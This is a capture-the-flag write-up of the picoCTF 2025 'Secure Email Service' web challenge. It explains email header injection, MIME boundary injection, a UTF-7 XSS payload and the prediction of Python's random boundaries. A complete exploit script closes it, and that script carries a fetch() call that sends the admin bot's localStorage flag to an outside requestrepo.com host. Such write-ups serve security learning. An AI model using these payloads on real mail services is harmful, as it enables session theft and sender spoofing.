---
title: "PicoCTF 2025"
categories: ["Writeup"]
tags: ["Web"]
#externalUrl: ""
date: 2025-03-25
draft: false
authors:
  - Hibwyli
---

# Secure Email Service 
This is the hardest web challenge from picoCTF.
Knowledge : MIME email document structure, Signed Email, Header Injection, Breaking weak cryptography.

## Find the sink : 
- So the challenge gives us a bot with flag in localStorage and does some stuffs. 
```python
from os import environ
from playwright.async_api import async_playwright, expect

import asyncio
import re

flag = environ.get('FLAG', 'picoCTF{flag}')
password = environ.get('PASSWORD', 'admin@ses')

async def bot():
	async with asyncio.timeout(12):
		async with async_playwright() as p:
			browser = await p.chromium.launch()
			page = await browser.new_page()
			await page.goto('http://127.0.0.1:8000')

			await page.evaluate('flag => localStorage.setItem("flag", flag)', flag)
			
			# login
			await page.type('[name=username]', 'admin@ses')
			await page.type('[name=password]', password)
			await page.click('button')

			# click on first email
			await page.wait_for_url('http://127.0.0.1:8000/inbox.html', wait_until='networkidle')
			try:
				await page.click('tbody tr', timeout=1000)
			except:
				await browser.close()
				return

			# click reply button
			await page.wait_for_url('http://127.0.0.1:8000/email.html?id=*', wait_until='networkidle')
			await expect(page.locator('#reply')).to_have_attribute('href', re.compile('.*'))
			await page.click('#reply button')

			# reply to email
			await page.wait_for_url('http://127.0.0.1:8000/reply.html?id=*', wait_until='networkidle')
			await page.type('textarea', '\n\n'.join([
				'We\'ve gotten your message and will respond soon.',
				'Thank you for choosing SES!',
				'Best regards,',
				'The Secure Email Service Team'
			]))
			await page.click('#reply button')
			await browser.close()

asyncio.run(bot())
```
Bot actions : 
+ Type admin email and password and login
+ Then click into the first email and visit that email.
+ After that it will reply that email 

So we must find some vulnerabilities in these action.
## How the email looks like ?

**Email from admin**
![image](https://hackmd.io/_uploads/Sko_Ja16kl.png)
**Email from user**
![image](https://hackmd.io/_uploads/H1bEgTJTJe.png)

- Looks like there is something difference here.Check the source code we find that.
```javascript
 const parsed = await parse(msg.data);

 document.getElementById('subject').innerText = parsed.subject;

  const replyUrl = new URL('/reply.html', origin);
  replyUrl.searchParams.set('id', id);
  document.getElementById('reply').href = replyUrl;

  const content = document.getElementById('content');
  if (parsed.html) {
    const signed = await getSigned(msg.data, await rootCert());
    if (signed) {
      const { html } = await parse(signed);
      const shadow = content.attachShadow({ mode: 'closed' });
      // Only sink  ?
      shadow.innerHTML = `<style>:host { all: initial }</style>${html}`;
    } else {
      content.style.color = 'red';
      content.innerText = 'invalid signature!';
    }
  } else {
    const pre = document.createElement('pre');
    pre.style.overflow = 'auto';
    pre.innerText = parsed.text;
    content.appendChild(pre);
  }
```
- There are 2 requirements for an email if I want it goes into the **sink innerHTML** :
### GOAL => Create an email contains :
1. After parsed it contains html field .
2. The msg.data is a valid data after signed with a key.

## Lets dig into the first requirement.
### So how the parse works ? 
- Oh its look like using a parse.wasm file 
![image](https://hackmd.io/_uploads/B1bP-aJa1l.png)
- Which is too terrible to reverse and try to understand....
- After reading the write up I found a trick to check if it comes from any well known library by checking the registry.

![image](https://hackmd.io/_uploads/Hkczz6y61l.png)
Now I can know that it uses the **mail-parser-0.9.4** at this time. 
**Note that its not the newest version so maybe we can find sth interesting**
- But we need a testing environment , so lets create some email based on context of this challenge .
## How the email generated from scratch ?
This code handles the flow : 
```python 
@app.post('/api/send')
async def send(
	user: Annotated[User, Depends(db.request_user)],
	to: Annotated[str, Body()],
	subject: Annotated[str, Body()],
	body: Annotated[str, Body()]
):
	# make sure the email we're sending to is valid
	recipient = await db.get_user(to)

	if len(user.public_key) == 0:
		# 
		msg = util.generate_email(
			sender=user.username,
			recipient=recipient.username,
			subject=subject,
			content=body,
		)
	else:
		# We control title through subject too 
		msg = util.generate_email(
			sender=user.username,
			recipient=recipient.username,
			subject=subject,
			content=template.render(
				title=subject,
				content=body
			),
			html=True,
			sign=True,
			cert=user.public_key,
			key=user.private_key
		)

	email_id = str(uuid.uuid4())
	await db.send_email(recipient, email_id, msg)

	return email_id
```

And the code to generate the 
```python
def generate_email(
	sender: str,
	recipient: str,
	subject: str,
	content: str,
	html: bool = False,
	sign: bool = False,
	cert: str = '',
	key: str = '',
) -> str:
	msg = MIMEMultipart()
	msg['From'] = sender
	msg['To'] = recipient
	msg['Subject'] = subject
	msg.attach(MIMEText(content))

	if html:
		msg.attach(MIMEText(content, 'html'))		

	if sign:
		return smail.sign_message(msg, key.encode(), cert.encode()).as_string()

	return msg.as_string()
```
- We can see the difference at privileges here. Admin can create a HTML message ans Signed. But the most interesting part is the way it generates the content 
```python
content=template.render(
        title=subject,
        content=body
),
```
And actually its not too easy that the jinja2 cannot be SSTI or Escaped with xss but it should be paid attention
```html
<!DOCTYPE html>
<html>
<body>
  <div class="email-container">
      <h1>{{ title }}</h1>
      <pre>{{ content }}</pre>
  </div>
</body>
</html>
```
- But it reads the ***title = subject***  and ***content = body***.
## Try to figure out what we can control ?
- So now we know that **ONLY ADMIN** can send an HTML valid email .
- Because the admin just send email from the *reply.html* so we just need to focus on this one .
```javascript
      const parsed = await parse((await email(id)).data);
      const subject = `Re: ${parsed.subject}`;
      document.getElementById('subject').innerText = subject;

      document.getElementById('reply').onsubmit = async e => {
        e.preventDefault();

        const body = document.querySelector('[name=body]').value;
        try {
          // The destination go through parser first
          await send(parsed.from, subject, body);
        } catch(e) {
          alert(e);
          return;
        }
```
- First it parse of email and then :
1. Send to parsed.from ? (but this is checked before the email sent to admin so we dont abuse this :v)
3. With subject = parsed.subject ? 
- Both of this is all **from the user** so lets test to find we can trick it or not.
- Example of email after parsed.
![image](https://hackmd.io/_uploads/SycDwaJTkx.png)
- Now we control the **Subject** right ? 
- Try to inject the headers with 
```email=
Subject:abc\nFrom:admin@ses  
```
- Its not a dream ,btw :vv 
![image](https://hackmd.io/_uploads/B1q7Fa161g.png)

- Lets try to audit the code to find the check 
- Python looks like block it before .
![image](https://hackmd.io/_uploads/BJ2ej6ya1l.png)
- This regex detects lines that start with a non-space, non-tab sequence followed by a colon (:). 
- So we just need to add a space before the ':' to bypass 
- Now get a new error check :D 
![image](https://hackmd.io/_uploads/B1g3jp1ayg.png)
```python
NEWLINE_WITHOUT_FWSP = re.compile(r'\r\n[^ \t]|\r[^ \n\t]|\n[^ \t]')
```
- Now i cannot bypass this anymore... seems a dead end ..
- Until i realize that Im using a different python version with the docker machine. Lets try again and this really works .Because there's no check at python3.11 
![image](https://hackmd.io/_uploads/BkAQ_Zx6kl.png)

```python
    msg['Subject'] = "HIHI\nFrom :admin@ses"
```
 ![image](https://hackmd.io/_uploads/Hkc-apyTkl.png)

## Progress 
- Now we can abuse the admin bot to send an email to itself !! and which it send to  we still not control ? Or we did ? We have header injection which is too powerful , we can just put **OUR EMAIL DATA** into it ? 
- But first calm down and think about the flow again now .
### FLOW EMAIL :
- We send our subject -> Admin parse it and be abused to reply to itself -> It create a template with our **subject** -> It send the template . 
- Admin visit the email itself and parse the msg.data -> check parsed -> check signed -> put into html or invalid siganture .
**- BTW , JUST DUMP ALL OUT**
```json
==========ADMIN RECEIVE THIS FROM USER=============
Content-Type: multipart/mixed; boundary="===============7785715794646824541=="
MIME-Version: 1.0
From: user@ses
To: admin@ses
Subject: HIHI
From :admin@ses

--===============7785715794646824541==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

IM TOO DUMP BRO
--===============7785715794646824541==--

============AFTER PARSING=======================
{
  "from": "admin@ses",
  "html": null,
  "subject": "HIHI",
  "text": "IM TOO DUMP BRO",
  "to": "admin@ses"
}

==================== ADMIN WILL SIGN THIS ====================
==================== PUT THE CONTENT=SUBJECT into JINJA=======
Content-Type: multipart/mixed; boundary="===============6803546522554613104=="
MIME-Version: 1.0
From: admin@ses
To: admin@ses
Subject: Re: HIHI

--===============6803546522554613104==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<!DOCTYPE html>
<html>
<body>
  <div class="email-container">
      ######THIS PLACE  WE CONTROL #########
      <h1>HIHI</h1>
      ######THIS PLACE  WE CONTROL #########
      <pre>We&#39;ve gotten your message and will respond soon.

Thank you for choosing SES!

Best regards,

The Secure Email Service Team</pre>
  </div>
</body>
</html>
--===============6803546522554613104==--

==================== ADMIN VISIT SECOND TIME AFTER PARSE====================

{
  "from": "admin@ses",
  "html": null,
  "subject": "Re: HIHI",
  "text": "<!DOCTYPE html>\n<html>\n<body>\n  <div class=\"email-container\">\n      <h1>HIHI</h1>\n      <pre>We&#39;ve gotten your message and will respond soon.\n\nThank you for choosing SES!\n\nBest regards,\n\nThe Secure Email Service Team</pre>\n  </div>\n</body>\n</html>",
  "to": "admin@ses"
}
```

- SO what if we must  do someway to make the **Subject** after parsed contains something like  : 
```python
subject : "\n----BOUND----\n Content-Type:text/html\n\nPAYLOAD\n---BOUND----\n" ?
```
- The idea is INJECTING at the jinja point
### BUT HOW WE CAN REMAIN THE NEWLINE THROUGH PARSER? 
- After reading and finding how to add special bytes into headers I found that we can use **ENCODING** with special structure.
```python=
def encode_base64(text):
    encoded_bytes = base64.b64encode(text.encode('utf-8'))
    return f'=?utf-8?B?{encoded_bytes.decode()}?='
```
- You see , we keep the '\n' remains which will jumped into the JINJA ?
![image](https://hackmd.io/_uploads/H1TlEAyT1e.png    )
- Result in the Resposne  : 
![image](https://hackmd.io/_uploads/HyDPV0ypke.png)
- Now we can modify the DATA ! But not really ....
## The Boundary is RANDOM ?
- If we want to modify this into valid email , we must someway choose the right boundary ? 
- BUt keep it simple here we just try if our payload can work with fixed boundary or not ? 
- Lets try with : 
```python=
payload  = f'\n--fixed2\nContent-Type : text/html\n\n<img src=x onerror=alert()>\n--fixed2\n'
msg['Subject'] = f"HIHI{encode_base64(payload)}\nFrom :admin@ses"
```
- It seem get escape ? 
![image](https://hackmd.io/_uploads/BkTHlJgaye.png)
- Its no matter because MIME support ENCODING for data too , so just use UTF-7 ENCODING (THERE IS SOME BUG ON base64 encoding and I dont know the reason why ?) :

```python
payload = f"""hi

--==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--==============={admin_boundary}==
"""
```
Now our dump will be like this : 
```json
==================== ADMIN WILL SIGN THIS ====================

Content-Type: multipart/mixed; boundary="===============adminone=="
MIME-Version: 1.0
From: admin@ses
To: admin@ses
Subject: Re: HIHI hi
--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0
+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==

--===============adminone==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<!DOCTYPE html>
<html>
<body>
  <div class="email-container">
      <h1>HIHI hi

--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==
</h1>
      <pre>We&#39;ve gotten your message and will respond soon.

Thank you for choosing SES!

Best regards,

The Secure Email Service Team</pre>
  </div>
</body>
</html>
--===============adminone==--

==================== ADMIN VISIT SECOND TIME AFTER PARSE====================

{
  "from": "admin@ses",
  "html": "--===============adminone==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n<!DOCTYPE html>\n<html>\n<body>\n  <div class=\"email-container\">\n      <h1>HIHI hi\n\n--===============adminone==\nContent-Type : text/html; charset=utf-7\nMIME-Version : 1.0\n\n<img src=\"x\" onerror=alert(1); />\n--===============adminone==\n</h1>\n      <pre>We&#39;ve gotten your message and will respond soon.\n\nThank you for choosing SES!\n\nBest regards,\n\nThe Secure Email Service Team</pre>\n  </div>\n</body>\n</html>\n--===============adminone==--\n",
  "subject": "Re: HIHI hi",
  "text": "--===============adminone==\nContent-Type: text/plain; charset=\"us-ascii\"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n<!DOCTYPE html>\n<html>\n<body>\n  <div class=\"email-container\">\n      <h1>HIHI hi\n\n--===============adminone==\nContent-Type : text/html; charset=utf-7\nMIME-Version : 1.0\n\n<img src=\"x\" onerror=alert(1); />\n--===============adminone==\n</h1>\n      <pre>We&#39;ve gotten your message and will respond soon.\n\nThank you for choosing SES!\n\nBest regards,\n\nThe Secure Email Service Team</pre>\n  </div>\n</body>\n</html>\n--===============adminone==--\n",
  "to": "admin@ses"
}
```
But after parsed it still not work ? After dynamically testing , i realize that this part make the parser error because its cannot understand the structure due to this point : 
```json
Subject: Re: HIHI hi
--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0
+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==
THIS CONFUSE THE PARSER 
--===============adminone==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

```

- But no matters , try it on server to understand why .
## WHAT HAPPENING HERE ? 
![image](https://hackmd.io/_uploads/HkxfKIgeTke.png)
- Wait what ? Its so non sense right ? 
But we must remember that , our data will be **SIGNED** before being parsed !!
Here is the real message after signed !!
- And message is sent by admin so the check signed must be valid because admin does it .
```json
Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg="sha-256"; boundary="===============admin2=="
MIME-Version: 1.0
From: admin@ses
To: admin@ses
Subject: Re: hi hi
--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0
+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==
### THIS PART IS ADDED INTO BETWEEN SUBJECT AND OUR DATA MAKES IT VALID BECAUSE IT DEFINED A BOUNDARY AGAIN :VV ###
This is an S/MIME signed message
--===============admin2==
Content-Type: multipart/mixed; boundary="===============adminone=="
MIME-Version: 1.0

--===============adminone==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<!DOCTYPE html>
<html>
<body>
  <div class="email-container">
      <h1>Re: hi hi

--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==
</h1>
      <pre>dsad</pre>
  </div>
</body>
</html>
--===============adminone==
Content-Type: text/html; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

<!DOCTYPE html>
<html>
<body>
  <div class="email-container">
      <h1>Re: hi hi

--===============adminone==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-alert(1)+ADs-+ACA-/+AD4-
--===============adminone==
</h1>
      <pre>dsad</pre>
  </div>
</body>
</html>
--===============adminone==--

--===============admin2==
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="smime.p7s"
Content-Description: S/MIME Cryptographic Signature

MIIFLQYJKoZIhvcNAQcCoIIFHjCCBRoCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGg
ggMlMIIDITCCAgmgAwIBAgIUHjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJKoZIhvcNAQELBQAwHjEc
MBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZTAeFw0yNTAzMjUwODU2NTFaFw0yNjAzMjUwODU2
NTFaMC4xEjAQBgNVBAMMCWFkbWluQHNlczEYMBYGCSqGSIb3DQEJARYJYWRtaW5Ac2VzMIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUWmhBhA9+K8pt1LEQx7SD0U+lrEyJjf0WdLX2Ht
4x12eWUN1cAzx/CqH3AUp+cRfBG42CFKT+TTrjz9K8nffUqhhOQpIQ4QtwhwWtHwjaBhRDKwo8mW
znr4/cYGdxTyQ+n2eBzFhdBOe5LsO3GLMqYnNFrCPLUHL3DIssOuRiZIdTBkrqeG44SrqWOXna7Z
hGOCygabdTZL93ucA2tLbtgW8Zg2/QwwU7f0Xx7HqGKpl7+Prt27gM3bZBRPXT2NU96/eW32Pgq3
qo3rC5jUMo2X+yCDB1PaGvxmbK/HSqCxLORYiRbhPA9vIuX8kUWJf9dtThPrUhXk4T+r+HwxQQID
AQABo0cwRTAUBgNVHREEDTALgQlhZG1pbkBzZXMwDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQG
CCsGAQUFBwMCBggrBgEFBQcDBDANBgkqhkiG9w0BAQsFAAOCAQEAm8mM0x6Xgs8YchYjePkFSpJJ
hQzzbhnuCGrOqTJxJqnN9BtfE8aoNxXlnaLl4V3QJHDa1OFGJjErXzvtWa2zGkJZYFRR3Y766rFS
1PngziYCYCYGlpuqm20y0CYAPctZ13TDLd0ZLHuqXdq1/rXo0fqacovPfEzTxcGZdaRufDg/kn1y
zSdBbw8XRwomJgwa1H7P9skGmydU1ASMJVonZjw1MY5HQ9MuW6VtmHAMMmy6XzimO477NiigakTc
xh+Juc+zXIoPHuH5wGj8gs2fiM99/GSjvJ+PndbBHxP4YlPKLqhfazv/jfpAM27FaT0V5+cKoRWB
w84hrdqbfj4EhTGCAcwwggHIAgEBMDYwHjEcMBoGA1UEAwwTc2VjdXJlLW1haWwtc2VydmljZQIU
HjR1RUpDc9PN3lIb5uOKlA9XHXMwDQYJYIZIAWUDBAIBBQCgaTAYBgkqhkiG9w0BCQMxCwYJKoZI
hvcNAQcBMBwGCSqGSIb3DQEJBTEPFw0yNTAzMjUwOTI1MDRaMC8GCSqGSIb3DQEJBDEiBCCSFpTh
K2LQn+v3iRjE7B+4JZVXzLtG4cDt2+/FZtRZ/TANBgkqhkiG9w0BAQEFAASCAQAQMSR1+i6O29/7
jPnuMcvBnD3eEtQSwxKlHVT/2+DxISVxPF7+YDG4TEwZbzSx43BsoVvI/dkak8nuRCdZoErvDU5V
Fm50PYeXxAvU4SB4T/mxTyDgsPRe5uBzRKyS2b3Qk+93EFFNHi4PACCIphzL3Tzs2fujqZoiE/pY
HFrQKhLqxx7EhxacyBdY82fJ6+/wk8hADBJ8mH3JsLktZQ7BRgsH32le1nJGgk5yBa13Uc5I//UE
c/Oe3RqWxoJLzl7m4iL2EEs2Si1U0DqGgtr+MzoUMDA//v4p5W6RWBq5Qn3Lb3r21Zw3IRbcLVAw
gu9g3l14WKYRtrY2WZ1eiyXr

--===============admin2==--
```
- YOu can see there is a part added between 2 boundary .
![image](https://hackmd.io/_uploads/HkNiDgl6Jx.png)
- Test it in local ![image](https://hackmd.io/_uploads/SyDjDll61x.png)
![image](https://hackmd.io/_uploads/SJhjDexaJe.png)

- We now can confirm that really affects to the response .
## NOW WE CAN TRIGGER XSS , JUST ONE FINAL THINGS...
- So now we can trigger XSS with only FIXED BOUNDARY right ? 
- So lets audit the code to check if we can predict or crack the random shitty.
```python
 def _make_boundary(cls ,text=None):
        # Craft a random boundary.  If text is given, ensure that the chosen
        # boundary doesn't appear in the text.
        token = random.randrange(sys.maxsize)
        boundary = ('=' * 15) + (_fmt % token) + '=='
        if text is None:
            return boundary
        b = boundary
        counter = 0
        while True:
            cre = cls._compile_re('^--' + re.escape(b) + '(--)?$', re.MULTILINE)
            if not cre.search(text):
                break
            b = boundary + '.' + str(counter)
            counter += 1
        return b
```
Im not too good at crypto so I just know there is a tool to crack it by collecting too much boundaries and predict . Here is the script 
```python
def get_boundary(s) -> int:
    data = {
        "to": "user@ses",
        "subject": 'hi',
        "body": "faewfef"
    }
    res  = s.post(url+'/api/send',json = data,headers=headers)
    print(res.text)
    a = res.text.strip('"')  # Remove surrounding quotes
    res  = s.get(url+'/api/email/'+a,json = data,headers=headers)
    boundary = re.findall(r"===============(\d+)==",res.json().get('data'))[0]
    return int(boundary)
import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py

def error(text):
	print(f"[\x1b[41mERROR\x1b[0m] {text}")
	sys.exit()

def info(text):
	print(f"[\x1b[32;1m+\x1b[0m] {text}")

ut = randCracker.Untwister()
for _ in range(800):
    b = bin(get_boundary(s))[2:].zfill(63)
    half1, half2 = b[:31], b[31:]
    half1 = half1 + '?'
    ut.submit(half2)
    ut.submit(half1)
    
r2 = ut.get_random()
# Let's send one more email to ourself and see if our prediction's correct.
info("State solved!") if r2.getrandbits(63) == get_boundary(s) else error("Boundary prediction failed.")
_ = r2.getrandbits(63) # skip over the email we send
print("CURRENT MUST BE ",_)
# Admin's boundary string!
converted_num = str(int(r2.getrandbits(63)))  # Convert to int and back to string
smileBOundary = converted_num
print(f"THIS IS SMILE SIGN BOUNDARY : {smileBOundary}")
admin_boundary = '%019d' % r2.getrandbits(63)
print(f"THIS MUST BE RIGHT  : {admin_boundary}")
print(f"FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}")
print(f"FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}")
```
## FINAL PROBLEM
- Now we simply use the predicted boundary and get flag right ? 
![image](https://hackmd.io/_uploads/H1hnAxlpyx.png)
- What happening to our boundary ? It adds .0 after ? 
- Look at the make_boundary to understand why 
```python
 def _make_boundary(cls ,text=None):
        # Craft a random boundary.  If text is given, ensure that the chosen
        # boundary doesn't appear in the text.
        token = random.randrange(sys.maxsize)
        boundary = ('=' * 15) + (_fmt % token) + '=='
        if text is None:
            return boundary
        b = boundary
        counter = 0
        while True:
            cre = cls._compile_re('^--' + re.escape(b) + '(--)?$', re.MULTILINE)
            if not cre.search(text):
                break
            b = boundary + '.' + str(counter)
            counter += 1
        return b
```python
cre = cls._compile_re('^--' + re.escape(b) + '(--)?$', re.MULTILINE)
```
- This regrex just check the '--' start at the beginning, a space can bypass ? And the parser will still understand...(ned audit too..) 
- HERE WE GET ITTTTTT !!!!!
![image](https://hackmd.io/_uploads/S19CeZeTJx.png)

### FINAL SCRIPT 
```python
import requests 
import sys
import re
import base64
s = requests.Session()
url = "http://localhost:8001"

data    = { 
    "username":"user@ses",
    "password":"50d93cda66e45ffc3c57623a14af2cc7"
}


res=  requests.post(url+'/api/login',json=data)
clean_hex = res.text.strip('"')  # Remove surrounding quotes
headers = { 
    'Token': clean_hex
}
print(res.text)
def encode_base64(text):
    encoded_bytes = base64.b64encode(text.encode('utf-8'))
    return f'=?utf-8?B?{encoded_bytes.decode()}?='
boundary = "===============adminone=="
def get_boundary(s) -> int:
    data = {
        "to": "user@ses",
        "subject": 'hi',
        "body": "faewfef"
    }
    res  = s.post(url+'/api/send',json = data,headers=headers)
    print(res.text)
    a = res.text.strip('"')  # Remove surrounding quotes
    res  = s.get(url+'/api/email/'+a,json = data,headers=headers)
    boundary = re.findall(r"===============(\d+)==",res.json().get('data'))[0]
    return int(boundary)

import randCracker # https://github.com/icemonster/symbolic_mersenne_cracker/blob/main/main.py

def error(text):
	print(f"[\x1b[41mERROR\x1b[0m] {text}")
	sys.exit()

def info(text):
	print(f"[\x1b[32;1m+\x1b[0m] {text}")

ut = randCracker.Untwister()
for _ in range(800):
    b = bin(get_boundary(s))[2:].zfill(63)
    half1, half2 = b[:31], b[31:]
    half1 = half1 + '?'
    ut.submit(half2)
    ut.submit(half1)
    
r2 = ut.get_random()
# Let's send one more email to ourself and see if our prediction's correct.
info("State solved!") if r2.getrandbits(63) == get_boundary(s) else error("Boundary prediction failed.")
_ = r2.getrandbits(63) # skip over the email we send
print("CURRENT MUST BE ",_)
# Admin's boundary string!
admin_boundary = '%019d' % r2.getrandbits(63)
print(f"THIS MUST BE RIGHT  : {admin_boundary}")
print(f"THIS IS OF SMILE KK: {r2.getrandbits(63)}")
print(f"FOUNDDDDDDDDDDDD next: {r2.getrandbits(63)}")


script =  base64.b64encode("fetch('https://vqbe0frw.requestrepo.com/?q='+localStorage.getItem('flag'))".encode('utf-8')).decode('utf-8').replace('=','+AD0-')
print(script)
payload = f"""hi

 --==============={admin_boundary}==
Content-Type : text/html; charset=utf-7
MIME-Version : 1.0

+ADw-img+ACA-src+AD0-+ACI-x+ACI-+ACA-onerror+AD0-eval(atob('{script}'))+ADs-+ACA-/+AD4-
 --==============={admin_boundary}==
"""

final_payload = f'hi=?ISO-8859-1?B?{base64.b64encode(payload.encode()).decode()}?=\nFrom : admin@ses'

data = {
    'to':"admin@ses",
    "subject": final_payload,
    "body":"HI"
}


res=  requests.post(url+'/api/send',json=data,headers=headers)
res=  requests.post(url+'/api/admin_bot',json=data,headers=headers)
res=  requests.post(url+'/api/admin_bot',json=data,headers=headers)
print(res.text)

```
## FINALLY 
![image](https://hackmd.io/_uploads/H1V2SWgayl.png)
This is superhard challenges and i learn a lot from this. As well as some skill to test the app . This is too valuable...

## Some questions ?
- Why we need a JINJA spots for executing this vulnerabiliites ?
-  And why injecting '\n' in headers work but not '\n\n' ? 
**Read the code lead us to result that there's a simple check**
```python
lines = string.splitlines()
        if lines:
            formatter.feed('', lines[0], charset)
        else:
            formatter.feed('', '', charset)
```
- So we cannot separate our payload outside the HEADER section to pollute the BODY section .
**Furthermore, there's something still in blackbox and I need time to figure it out. Just keep having fun.**